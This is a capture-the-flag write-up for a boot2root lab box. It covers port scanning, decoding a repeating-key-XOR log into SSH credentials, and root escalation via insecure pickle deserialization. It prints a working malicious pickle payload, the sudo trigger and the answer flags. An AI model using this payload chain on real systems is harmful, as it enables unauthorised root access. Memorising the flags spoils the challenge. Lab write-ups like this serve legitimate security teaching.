<div align="center">

<a href="https://git.io/typing-svg"><img src="https://readme-typing-svg.demolab.com?font=Fira+Code&size=28&duration=700&pause=1000&color=E8423F&center=true&vCenter=true&repeat=false&width=500&height=35&lines=Radio+Shack" alt="Typing SVG" /></a>

</div>

# Radio Shack — PWN · JID-Pwn200 · Level 1 · 🟡 MEDIUM

- **Status:** ✅ SOLVED (4/4) — full boot2root chain to `root.txt`.
- **Points:** 1400 / 1400 (ports 150 · user 250 · user flag 400 · root 600)
- **Flags:** Open TCP ports → Low privilege user → User flag → Root flag (`CTF{...}` for the file flags)
- **Target:** `10.10.10.20` (lab, over WireGuard VPN)
- **Prompt:** *"Signal log" — boot2root chain.*

| # | Flag | Answer | Status |
|---|------|--------|--------|
| 1 | Open TCP ports | `2200,8082` | ✅ |
| 2 | Low privilege user | `sentry` | ✅ |
| 3 | User flag | `CTF{38a0bec927b6b16abc42b3d0f80f4aae}` | ✅ |
| 4 | Root flag | `CTF{4281cad7a41081d56b59bac1984bedcd}` | ✅ |

---

## TL;DR

1. `nmap` → `2200,8082`; the `:8082` "Signal log" serves `/about` (the masking scheme) and `/log.bin` (masked bytes).
2. `/about` says callsign `BLACKOUT`, vowels stripped, pad repeats → repeating-key XOR with key `BLCKT`; unmasks `/log.bin` to `ssh sentry / lamp-77`.
3. `user.txt` at `/home`; `sudo NOPASSWD python3 /opt/signal/loadjob.py` `pickle.load`s attacker-owned `/home/sentry/job.pkl` → RCE as root via `__reduce__` → root flag.

A four-stage chain, 5th sibling of the JID boot2root series (cf. `HarborWatch`, `VisitorBadges`, `NightWatchRoster`, `EscortConvoy`): recon → a themed `BaseHTTPServer` serves a **repeating-key-XOR-masked** signal log that spells out the SSH credential → foothold as `sentry` → `sudo` runs a root script that **`pickle.load`s a file we own** → arbitrary code as root. The "Medium" twist is the crypto step on flag 2 and the insecure-deserialization privesc on flag 4.

---

## Recon — Flag 1: Open TCP ports

Full reliable TCP scan:

```bash
nmap -p- -T4 --min-rate 2000 --max-retries 3 10.10.10.20 -oN nmap-20-full.txt
```

```
2200/tcp open  ici
8082/tcp open  blackice-alerts
# 199 ports filtered (no-response), rest closed
```

Service/version:

```bash
sudo nmap -sC -sV -p 2200,8082 10.10.10.20 -oN nmap-20-svc.txt
```

```
2200/tcp open ssh  OpenSSH 9.2p1 Debian 2+deb12u10 (protocol 2.0)
8082/tcp open http BaseHTTPServer 0.6 (Python 3.11.2)  -- title "Signal log"
```

**Flag 1** = open ports only, ascending, comma-separated, plaintext (the 199 `filtered` ports are excluded — HarborWatch lesson):

```
2200,8082
```

> SSH 9.2p1 is patched → not the vector, just the foothold destination. The custom Python `BaseHTTPServer` "Signal log" on :8082 is the attack surface (same mould as the series; SSH is just on the non-standard port 2200).

---

## Foothold — Flag 2: Low privilege user

### The web app (:8082)

`GET /` renders a "SIGNAL SHACK / Signal log" page with two links: `/about` and `/log.bin`.

`/about` states the mechanic verbatim:

```bash
curl -sS http://10.10.10.20:8082/about
```
> **"Callsign BLACKOUT. Traffic is masked with the duty pad. Vowels are stripped, then the pad repeats."**

`/log.bin` is the masked traffic — 21 bytes of ASCII:

```bash
curl -sS http://10.10.10.20:8082/log.bin -o /tmp/log.bin
od -An -tx1 /tmp/log.bin
```
```
31 3f 2b 6b 27 27 22 37 39 2d 62 63 63 27 35 2f 3c 6e 7c 63 48
```

### Decoding (local analysis of the downloaded file)

Reading the hint precisely:
- **"duty pad" = the callsign `BLACKOUT`**, used as a **repeating key** ("the pad repeats") → repeating-key XOR.
- **"Vowels are stripped"** → strip vowels from the pad: `BLACKOUT` → `BLCKT` (drop `A`, `O`, `U`). This 5-char key is what makes the XOR produce clean text.

Repeating-key XOR of the 21 bytes against `BLCKT`:

```
ssh sentry / lamp-77
```

`solve.py` reproduces it:

```bash
python3 -I solve.py            # -> 'ssh sentry / lamp-77'  ->  user=sentry pass=lamp-77
```

Applying the series' credential rules:
- **Username** = the role, lowercase → **`sentry`** (night-watch role, fits the theme).
- **Password** = the **literal** value, keep the trailing `-77` (do NOT strip it — same as `keelhorn-7` in HarborWatch) → **`lamp-77`**.

### SSH → foothold

```bash
ssh -p 2200 -o NumberOfPasswordPrompts=1 sentry@10.10.10.20     # password: lamp-77
```
```
sentry@29658bfbde28:~$ id
uid=1000(sentry) gid=1000(sentry) groups=1000(sentry)
```

**Flag 2** (low-priv username, plaintext) = `sentry`

> Host is a Docker container (hostname `29658bfbde28`). `id` shows no extra group — the HarborWatch "group-readable root password" trick does NOT apply here; privesc is different (see flag 4).

---

## User flag — Flag 3

```bash
find / -iname 'user.txt' 2>/dev/null       # -> /home/user.txt
cat /home/user.txt
```

**Flag 3** = `CTF{38a0bec927b6b16abc42b3d0f80f4aae}`

> Same placement as the siblings: not in `~`, one level up at `/home/user.txt`.

---

## Privesc — Flag 4: Root flag

`sudo -l` shows one root `NOPASSWD` entry:

```bash
sudo -l
# (root) NOPASSWD: /usr/bin/python3 /opt/signal/loadjob.py
```

The script:

```bash
ls -la /opt/signal/          # loadjob.py is root:root 644; /opt/signal not writable
cat /opt/signal/loadjob.py
```
```python
import pickle, pathlib
p = pathlib.Path('/home/sentry/job.pkl')
if p.exists():
    pickle.load(p.open('rb'))
```

**Insecure deserialization (CWE-502).** `loadjob.py` runs as root (via the sudo rule) and `pickle.load`s `/home/sentry/job.pkl` — a path **we own**. `pickle.load` invokes the object's `__reduce__`, i.e. arbitrary code execution as root. `/opt/signal` is root-owned (no import hijack), but the pickle lives in our home, which is the whole point.

Craft a malicious pickle whose `__reduce__` copies root's flag to a readable location:

```bash
python3 - <<'EOF'
import pickle, os
class Job:
    def __reduce__(self):
        return (os.system, ("cat /root/root.txt > /home/sentry/root.flag; chmod 644 /home/sentry/root.flag",))
open("/home/sentry/job.pkl","wb").write(pickle.dumps(Job()))
EOF
```

Trigger it through the sudo rule (the `os.system` runs as root):

```bash
sudo /usr/bin/python3 /opt/signal/loadjob.py
cat /home/sentry/root.flag
```

**Flag 4** = `CTF{4281cad7a41081d56b59bac1984bedcd}`

---

## Summary / Chain

| # | Flag | Vector |
|---|------|--------|
| 1 | Open TCP ports | `nmap -p-` → `2200,8082` (199 filtered excluded) |
| 2 | Low privilege user | `/about` reveals BLACKOUT repeating-key-XOR (vowel-stripped pad `BLCKT`); `/log.bin` unmasks to `ssh sentry / lamp-77` → SSH :2200 as `sentry` |
| 3 | User flag | `/home/user.txt` → `CTF{38a0bec927b6b16abc42b3d0f80f4aae}` |
| 4 | Root flag | `sudo NOPASSWD python3 /opt/signal/loadjob.py` → `pickle.load('/home/sentry/job.pkl')` as root; malicious `__reduce__` → `CTF{4281cad7a41081d56b59bac1984bedcd}` |

### Takeaways
- **Read the "about" before touching anything.** The masking scheme was fully specified: callsign = key, "pad repeats" = repeating-key XOR, "vowels stripped" = `BLACKOUT`→`BLCKT`. No guessing needed.
- **Credential rules held again:** username = role lowercase (`sentry`); password = literal value including the trailing `-77` (never strip the suffix).
- **Privesc varies across the series.** Not the group-read (Harbor/Escort) nor the `sudo`+`source` (Visitor) — here it's `pickle.load` of an attacker-owned file as root. Never unpickle data from a writable/untrusted path in a privileged context; use a safe format (JSON) or sign the payload.

### Note
- Claude never ran anything against the target; every command here was executed manually by the player. Decoding `/log.bin` was local analysis of a downloaded file.
